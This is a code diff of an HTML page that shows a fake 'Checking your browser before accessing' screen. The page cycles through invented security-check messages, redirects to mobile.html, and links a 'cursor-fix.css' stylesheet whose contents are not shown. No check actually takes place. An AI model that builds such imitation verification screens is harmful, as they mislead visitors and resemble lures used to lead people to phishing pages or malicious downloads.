@@ -1,49 +1,98 @@
 <!DOCTYPE html>
+
 <html lang="en">
+
 <head>
+
     <meta charset="UTF-8">
+
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
     <title>Verification</title>
+
     <style>
+
         .verification-container {
+
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+
             background: #0f172a; color: #f8fafc; z-index: 999999;
+
             display: flex; flex-direction: column; justify-content: center; align-items: center;
+
             font-family: -apple-system, BlinkMacSystemFont, sans-serif; padding: 24px; text-align: center;
+
         }
+
         .spinner { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.1); border-top: 6px solid #38bdf8; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 25px; }
+
         @keyframes spin { 100% { transform: rotate(360deg); } }
+
         h1 { font-size: 22px; margin: 0 0 12px 0; }
+
         .sub-text { font-size: 14px; color: #94a3b8; margin-bottom: 20px; }
+
         .status-badge { font-size: 11px; color: #38bdf8; background: rgba(56, 189, 248, 0.1); padding: 4px 12px; border-radius: 99px; margin-bottom: 10px; }
+
     </style>
+    <link rel="stylesheet" href="cursor-fix.css">
 </head>
+
 <body>
+
     <div class="verification-container">
+
         <div class="spinner"></div>
+
         <h1>Checking your browser before accessing</h1>
+
         <p class="sub-text">This process is automatic. Your browser will redirect to your requested content shortly.</p>
+
         <div id="status" class="status-badge">Initializing...</div>
+
     </div>
 
+
+
     <script>
+
         (function() {
+
             const messages = ['Initializing...', 'Checking security...', 'Validating...', 'Almost done...'];
+
             let i = 0;
+
             const statusEl = document.getElementById('status');
+
             
+
             const interval = setInterval(() => {
+
                 if (i < messages.length) {
+
                     statusEl.textContent = messages[i];
+
                     i++;
+
                 } else {
+
                     clearInterval(interval);
+
                     setTimeout(() => {
+
                         window.location.href = 'mobile.html';
+
                     }, 1000);
+
                 }
+
             }, 800);
+
         })();
+
     </script>
+
 </body>
+
 </html>
+
